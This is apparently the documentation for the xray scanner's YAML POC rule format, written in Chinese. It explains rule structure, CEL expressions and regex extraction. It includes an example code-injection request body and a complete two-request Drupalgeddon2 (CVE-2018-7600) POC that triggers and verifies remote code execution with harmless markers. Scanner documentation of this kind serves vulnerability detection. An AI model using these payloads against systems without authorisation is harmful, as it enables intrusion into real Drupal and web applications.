# 如何编写YAML格式POC

xray支持用户自己编写YAML格式的POC规则，YAML是JSON的超集，也就是说，你甚至可以用JSON编写POC，但这里还是建议大家使用YAML来编写，原因如下：

1. YAML的值无需使用双引号包裹，所以特殊字符无需转义
2. YAML的内容更加可读
3. YAML中可以使用注释

## POC结构

一个最基础的POC如下：

```yaml
name: poc-yaml-example-com
rules:
  - method: GET
    path: "/"
    expression: |
      status==200 && body.bcontains(b'Example Domain')
```

整个POC是一个键值对，其包含3个键：

- `name: string`
- `rules: []Rule`
- `detail: map[string]string`

name是POC的名字，我们使用一个英文字母、数字和短横线进行表示，如`poc-yaml-thinkphp523-rce`。

rules是一个由规则（Rule）组成的列表，后面会描述如何编写Rule，并将其组成rules。

detail是一个键值对，内部存储需要返回给xray引擎的内容，如果无需返回内容，可以忽略。

## 如何编写Rule

Rule就是我们POC的灵魂，在YAML中一个Rule是一个键值对，其包含如下键：

- `method: string` 请求方法
- `path: string` 请求的完整Path，包括querystring等
- `headers: map[string]string` 请求HTTP头，Rule中指定的值会被覆盖到原始数据包的HTTP头中
- `body: string` 请求的Body
- `follow_redirects: bool` 是否允许跟随300跳转
- `expression: string`
- `search: string`

根据这些键的作用，我们将其分为三类：

1. `method`、`path`、`headers`、`body`、`follow_redirects`的作用是生成检测漏洞的数据包
2. `expression`的作用是判断该条Rule的结果
3. `search`的作用是从返回包中提取信息

xray对于POC扫描的流程如下：

POC模块在收到用户的一个请求后，开始对这个目标进行漏洞扫描。根据Rule中的`method`、`path`、`headers`、`body`、`follow_redirects`键值，替换原始数据包中的对应信息。

替换后的数据包被发送，并获得返回包，再执行expression表达式，表达式结果作为该条Rule的结果；同时，我们通过search指定的正则表达式，可以从返回包body中提取一些信息，作为下一个rule，或detail中可以被引用的内容。

### 如何编写expression表达式

如果说Rule是一个POC的灵魂，那么expression表达式就是Rule的灵魂。

正如spring使用SpEL表达式，struts2使用OGNL表达式，xray使用了编译性语言Golang，所以为了实现动态执行一些规则，我们使用了Common Expression Language (CEL)表达式。

关于CEL表达式项目的详细信息，可以参考<https://github.com/google/cel-spec>项目。如果你只是编写一些简单的规则，只需要阅读本文档的即可。

我们从上述示例中的表达式开始说起：

```
status==200 && body.bcontains(b'Example Domain')
```

CEL表达式通熟易懂，非常类似于一个Python表达式。上述表达式的意思是：**返回包status等于200，且body中包含内容“Example Domain”**。

expression表达式上下文包含的变量暂时只有如下三个，之后会逐渐进行扩展：

变量名 | 类型 | 说明
---- | ---- | ----
`status` | `int` | 返回包的status code
`body` | `[]byte` | 返回包的Body，因为是一个字节流（bytes）而非字符串，后面判断的时候需要使用字节流相关的方法
`content_type` | `string` | 返回包的content-type头的值

expression表达式上下文包含所有CEL文档中支持的函数，同时还包含xray引擎中自定义的函数，常用的函数如下：

函数名 | 函数原型 | 说明
---- | ---- | ----
`contains` | `func (s1 string) contains(s2 string) bool` | 判断s1是否包含s2，返回bool类型结果。
`bcontains` | `func (b1 bytes) bcontains(b2 bytes) bool` | 判断一个b1是否包含b2，返回bool类型结果。与contains不同的是，bcontains是字节流（bytes）的查找。
`matches` | `func (s1 string) matches(s2 string) bool` | 使用正则表达式s1来匹配s2，返回bool类型匹配结果。
`bmatches` | `func (s1 string) bmatches(b1 bytes) bool` | 使用正则表达式s1来匹配b1，返回bool类型匹配结果。与matches不同的是，bmatches匹配的是字节流（bytes）。
`startsWith` | `func (s1 string) startsWith(s2 string) bool` | 判断s1是否由s2开头
`endsWith` | `func (s1 string) endsWith(s2 string) bool` | 判断s1是否由s2结尾

值得注意的是，类似于python，CEL中的字符串可以有转义和前缀，如：

- `'\r\n'` 表示换行
- `r'\r\n'` 不表示换行，仅仅表示这4个字符。在编写正则时很有意义。
- `b'test'` 一个字节流（bytes），在golang中即为`[]byte`

用一些简单的例子来覆盖大部分我们可能用到的表达式：

- `body.bcontains(b'test')`
  - 返回包body包含test，因为body是一个bytes类型的变量，所以我们需要使用bcontains方法，且其参数也是bytes
- `content_type.contains('application/octet-stream') && body.bcontains(b'\x00\x01\x02')`
  - 返回包的content-type包含“application/octet-stream”，且body中包含0x000102这段二进制串
- `content_type.contains('zip') && r'^PK\x03\x04'.bmatches(body)`
  - 这个规则用来判断返回的内容是否是zip文件，需要同时满足条件：content-type包含关键字“zip”，且body匹配上正则r'^PK\x03\x04'（就是zip的文件头）。因为startsWith方法只支持字符串的判断，所以这里没有使用。
- `status >= 300 && status < 400`
  - 返回包的status code在300~400之间
- `(status >= 500 && status != 502) || r'<input value="(.+?)"'.bmatches(body)`
  - 返回包status code大于等于500且不等于502，或者Body包含表单

expression表达式返回的必须是一个bool类型的结果，这个结果作为整个Rule的值，而rules由多个Rule组成。值为true的Rule，如果后面还有其他Rule，则继续执行后续Rule，如果后续没有其他Rule，则表示该POC的结果是true；如果一个Rule的expression返回false，则不再执行后续Rule，也表示本POC的返回结果是false。

也就是说，一个POC的rules中，最后一个Rule的值，决定是否存在漏洞。

### search的作用

一个Rule中，可以支持使用search来查找返回包中的内容；当然，如果不需要查找内容，则可以忽略search。

search是一个字符串类型的正则表达式，我们用一个简单的案例来进行说明。

```yaml
name: poc-yaml-example-com
rules:
  - method: GET
    path: "/update"
    expression: "true"
    search: |
      <input type="hidden" name="csrftoken" value="(.+?)"
  - method: POST
    path: "/update"
    body: |
      id=';echo(md5(123));//&csrftoken={{1}}
    expression: |
      status == 200 && body.bcontains(b'202cb962ac59075b964b07152d234b70')
```

目标漏洞是一个简单的代码执行，但因为是POST请求，所以需要先获取当前用户的CSRF Token。所以，我们的POC分为两个Rule，第一个Rule发送GET请求，并使用search指定的正则提取返回包中的csrftoken表单值，此时expression直接执行表达式`true`，表示第一条规则一定执行成功；第二个Rule发送POST请求，此时，我们可以在path、body、headers中使用前一个规则search的结果，如`{{0}}`、`{{1}}`等。

`{{`、`}}`中包含的数字是正则的提取的group数组，0表示匹配的整个内容，1、2、3...n表示匹配到的第n个group。我这里取到的value值是第1个结果，所以使用`{{1}}`。如果正则没有匹配成功，或者n不在group范围内，这里不会进行替换。

## 一些细节上的说明

在编写expression表达式的时候，尤其要注意一个问题：yaml字符串的转义，与CEL表达式字符串里的转义。

yaml中，如果要编写一个字符串类型的值，可以使用引号进行包裹，如：

```yaml
name: "value"
```

但如果value中有反斜线，会在解析yaml的时候进行转义。那么如果expression表达式代码中也存在双引号或转义符，此时转义符就已经没有了，我们需要双重转义，这个时候编写的代码就非常不可读也不可维护。

所以，建议使用yaml中支持的[块样式（block style）](https://yaml.org/spec/1.2/spec.html#style/block/)来表示，如：

```
expression: |
  status == 200 && body.bcontains(b'\x01\x02\x03')
```

此时在YAML层面无需转义。

## 一个示例POC：《Drupal7 drupalgeddon2 命令执行漏洞（CVE-2018-7600）》

这里给出一个样例POC：

```yaml
name: poc-yaml-drupal-drupalgeddon2-rce
rules:
  - method: POST
    path: "/?q=user/password&name[%23post_render][]=printf&name[%23type]=markup&name[%23markup]=test%25%25test"
    headers:
      User-Agent: "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)"
    body: |
      form_id=user_pass&_triggering_element_name=name&_triggering_element_value=&opz=E-mail+new+Password
    search: |
      name="form_build_id"\s+value="(.+?)"
    expression: |
      status==200
  - method: POST
    path: "/?q=file%2Fajax%2Fname%2F%23value%2F{{1}}"
    headers:
      User-Agent: "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)"
    body: |
      form_build_id={{1}}
    expression: |
      body.bcontains(b'test%test')
detail:
  drupal_version: 7
```

该POC分为两个Rule，第一个发送一个POST包，将我们需要的Payload注入缓存中，同时，利用search字段提取缓存ID；第二个数据包，将前面提取的缓存ID`{{1}}`，拼接到body中，触发代码执行漏洞，并使用`body.bcontains(b'test%test')`来判断是否成功执行。

关于这个漏洞的原理，可以参考这篇文章：<https://paper.seebug.org/578/>。
